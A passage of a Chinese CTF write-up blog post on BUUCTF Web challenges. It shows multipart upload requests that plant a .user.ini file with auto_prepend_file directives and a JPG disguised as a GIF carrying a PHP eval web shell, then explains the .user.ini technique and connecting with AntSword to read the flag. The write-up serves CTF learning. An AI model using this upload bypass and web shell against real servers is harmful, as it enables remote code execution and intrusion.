+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;fileUpload&quot;; filename&#x3D;&quot;.user.ini&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">auto_prepend_file&#x3D;1.jpg</span><br><span class="line">auto_prepend_file&#x3D;2.jpg</span><br></pre></td></tr></table></figure>
+<p>上传包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;fileUpload&quot;; filename&#x3D;&quot;2.jpg&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&#39;php&#39;&gt; @eval($_POST[&#39;pass&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<p>蚁剑连接返回目录下的index.php，得到flag</p>
+<h2 id="user-ini上传"><a href="#user-ini上传" class="headerlink" title=".user.ini上传"></a>.user.ini上传</h2><p><strong>使用条件：</strong><br> (1)服务器脚本语言为PHP<br> (2)对应目录下面有可执行的php文件<br> (3)服务器使用CGI／FastCGI模式</p>
+<p><code>.user.ini</code>实际上就是一个可以由用户“自定义”的<code>php.ini</code>，我们可以自定义除了<code>PHP_INI_SYSTEM</code>以外的模式，在执行php代码之前，系统会对<code>.user.ini</code>先做一个执行，然后才执行其他的php文件。</p>
+<p>我们这边利用<code>.user,ini</code>先执行<code>auto_prepend_file</code>函数，<code>auto_prepend_file</code>表示在php程序加载第一个php代码前加载的php文件，也就是先加载了a.jpg里面的文件，即一句话木马。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/28/CTF-wp-BUUCTF-Web/" data-id="ckluk74e00007mkus0voo1jgw" data-title="CTF-wp-BUUCTF Web" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/03/01/DEV-perl/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          dev-perl
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/02/26/CTF-Web-php/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">CTF-Web-php</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dev/" rel="tag">dev</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E5%AD%A6/" rel="tag">文学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%80%83%E8%AF%81/" rel="tag">考证</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/dev/" style="font-size: 15px;">dev</a> <a href="/tags/%E6%96%87%E5%AD%A6/" style="font-size: 10px;">文学</a> <a href="/tags/%E8%80%83%E8%AF%81/" style="font-size: 10px;">考证</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/03/04/CTF-wp-Hack101/">CTF-wp-Hack101</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/04/DEV-python-flask/">DEV-python-flask</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/02/DEV-python-tornado/">DEV-python-tornado</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/01/DEV-perl/">dev-perl</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/28/CTF-wp-BUUCTF-Web/">CTF-wp-BUUCTF Web</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2021 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
